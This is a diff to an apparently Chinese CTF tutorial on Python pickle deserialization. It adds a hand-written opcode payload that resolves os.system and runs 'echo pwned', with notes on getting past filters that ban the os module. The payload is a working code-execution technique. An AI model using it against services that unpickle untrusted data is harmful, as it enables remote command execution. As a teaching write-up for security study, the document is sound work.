@@ -71,7 +71,18 @@ print(base64.b64encode(pickle.dumps(RCE())))
 # 手写 opcode
 因为 pickle.dumps 记录的模块名和生成环境绑定，os 只是外壳，os.system 实际属于平台模块。在Windows 上是 nt 模块，而Linux 上是 posix。有些题目会禁用os，那这时候可以用它其他的模块名进行绕过，但在使用脚本的时候，我没法指定生成os这个模块的其他模块名，所以这时候就需要手写opcode了
 
+```python
+import pickle, pickletools
 
+payload = (b"Vos\n"          # 压入 'os'
+           b"Vsystem\n"      # 压入 'system'
+           b"\x93"           # STACK_GLOBAL -> os.system
+           b"(S'echo pwned'\n"
+           b"tR.")
+pickletools.dis(payload)     # 检查每条指令是否符合预期
+pickle.loads(payload)        # 本地验证
+```
+当然，不用脚本自己手动拼成一个字符串也可以b"Vos\nVsystem\n\x93(S'echo pwned'\ntR."
 
 # pickle opcode 对照表（protocol 0）
 
